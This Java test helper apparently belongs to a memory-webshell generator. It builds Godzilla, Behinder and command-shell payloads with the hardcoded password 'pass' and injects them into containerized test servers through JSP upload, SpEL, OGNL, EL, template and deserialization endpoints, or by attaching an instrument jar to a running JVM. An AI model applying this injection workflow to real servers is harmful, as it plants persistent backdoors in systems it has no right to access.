package com.reajason.javaweb.integration;

import com.reajason.javaweb.GeneratorMain;
import com.reajason.javaweb.memshell.SpringMVCShell;
import com.reajason.javaweb.memshell.SpringWebFluxShell;
import com.reajason.javaweb.memshell.config.*;
import com.reajason.javaweb.memshell.packer.JarPacker;
import com.reajason.javaweb.memshell.packer.Packer;
import lombok.SneakyThrows;
import lombok.extern.slf4j.Slf4j;
import org.testcontainers.containers.GenericContainer;
import org.testcontainers.shaded.org.apache.commons.io.FileUtils;
import org.testcontainers.shaded.org.apache.commons.lang3.StringUtils;
import org.testcontainers.utility.MountableFile;

import java.nio.file.Files;
import java.nio.file.Path;

import static org.hamcrest.CoreMatchers.anyOf;
import static org.hamcrest.CoreMatchers.containsString;
import static org.hamcrest.MatcherAssert.assertThat;
import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;

/**
 * @author ReaJason
 * @since 2024/12/5
 */
@Slf4j
public class ShellAssertionTool {

    public static void testShellInjectAssertOk(String url, Server server, String shellType, ShellTool shellTool, int targetJdkVersion, Packer.INSTANCE packer) {
        testShellInjectAssertOk(url, server, shellType, shellTool, targetJdkVersion, packer, null);
    }

    @SneakyThrows
    public static void testShellInjectAssertOk(String url, Server server, String shellType, ShellTool shellTool, int targetJdkVersion, Packer.INSTANCE packer, GenericContainer<?> container) {
        String shellUrl = url + "/test";

        String urlPattern = null;
        if (shellType.endsWith(Constants.SERVLET)
                || shellType.endsWith(SpringMVCShell.CONTROLLER_HANDLER)
                || shellType.equals(SpringWebFluxShell.HANDLER_METHOD)
                || shellType.equals(SpringWebFluxShell.HANDLER_FUNCTION)
        ) {
            urlPattern = "/" + shellTool + shellType + packer.name();
            shellUrl = url + urlPattern;
        }

        GenerateResult generateResult = generate(url, urlPattern, server, shellType, shellTool, targetJdkVersion, packer);

        String content = null;
        if (packer.getPacker() instanceof JarPacker) {
            byte[] bytes = packer.getPacker().packBytes(generateResult);
            Path tempJar = Files.createTempFile("temp", "jar");
            Files.write(tempJar, bytes);
            String jarPath = "/" + shellTool + shellType + packer.name() + ".jar";
            container.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
            FileUtils.deleteQuietly(tempJar.toFile());
            String pidInContainer = container.execInContainer("bash", "/fetch_pid.sh").getStdout();
            assertDoesNotThrow(() -> Long.parseLong(pidInContainer));
            String stdout = container.execInContainer("/jattach", pidInContainer, "load", "instrument", "false", jarPath).getStdout();
            log.info("attach result: {}", stdout);
            assertThat(stdout, anyOf(
                    containsString("ATTACH_ACK"),
                    containsString("JVM response code = 0")
            ));
        } else {
            content = packer.getPacker().pack(generateResult);
            assertInjectIsOk(url, shellType, shellTool, content, packer, container);
        }

        switch (shellTool) {
            case Godzilla:
                GodzillaShellTool.testIsOk(shellUrl, ((GodzillaConfig) generateResult.getShellToolConfig()));
                break;
            case Command:
                CommandShellTool.testIsOk(shellUrl, ((CommandConfig) generateResult.getShellToolConfig()));
                break;
            case Behinder:
                BehinderShellTool.testIsOk(shellUrl, ((BehinderConfig) generateResult.getShellToolConfig()));
        }
    }

    public static GenerateResult generate(String url, String urlPattern, Server server, String shellType, ShellTool shellTool, int targetJdkVersion, Packer.INSTANCE packer) {
        InjectorConfig injectorConfig = new InjectorConfig();
        if (StringUtils.isNotBlank(urlPattern)) {
            injectorConfig.setUrlPattern(urlPattern);
        }

        ShellConfig shellConfig = ShellConfig.builder()
                .server(server)
                .shellTool(shellTool)
                .shellType(shellType)
                .targetJreVersion(targetJdkVersion)
                .debug(true)
                .build();

        ShellToolConfig shellToolConfig = null;
        String uniqueName = shellTool + shellType + packer.name();
        switch (shellTool) {
            case Godzilla:
                String godzillaPass = "pass";
                String godzillaKey = "key";
                shellToolConfig = GodzillaConfig.builder()
                        .pass(godzillaPass).key(godzillaKey)
                        .headerName("User-Agent").headerValue(uniqueName)
                        .build();
                log.info("generated {} godzilla with pass: {}, key: {}, headerValue: {}", shellType, godzillaPass, godzillaKey, uniqueName);
                break;
            case Command:
                shellToolConfig = CommandConfig.builder()
                        .paramName(uniqueName)
                        .build();
                log.info("generated {} command shell with paramName: {}", shellType, uniqueName);
                break;
            case Behinder:
                String behinderPass = "pass";
                shellToolConfig = BehinderConfig.builder()
                        .pass(behinderPass)
                        .headerName("User-Agent")
                        .headerValue(uniqueName)
                        .build();
                log.info("generated {} behinder with pass: {}, headerValue: {}", shellType, behinderPass, uniqueName);
                break;
        }
        return GeneratorMain.generate(shellConfig, injectorConfig, shellToolConfig);
    }

    public static void assertInjectIsOk(String url, String shellType, ShellTool shellTool, String content, Packer.INSTANCE packer, GenericContainer<?> container) {
        switch (packer) {
            case JSP -> {
                String uploadEntry = url + "/upload";
                String filename = shellType + shellTool + ".jsp";
                String shellUrl = url + "/" + filename;
                VulTool.uploadJspFileToServer(uploadEntry, filename, content);
                VulTool.urlIsOk(shellUrl);
            }
            case ScriptEngine -> VulTool.postData(url + "/js", content);
            case EL -> VulTool.postData(url + "/el", content);
            case SpEL -> VulTool.postData(url + "/spel", content);
            case OGNL -> VulTool.postData(url + "/ognl", content);
            case Freemarker -> VulTool.postData(url + "/freemarker", content);
            case Velocity -> VulTool.postData(url + "/velocity", content);
            case Deserialize -> VulTool.postData(url + "/java_deserialize", content);
            case Base64 -> VulTool.postData(url + "/b64", content);
        }
    }
}
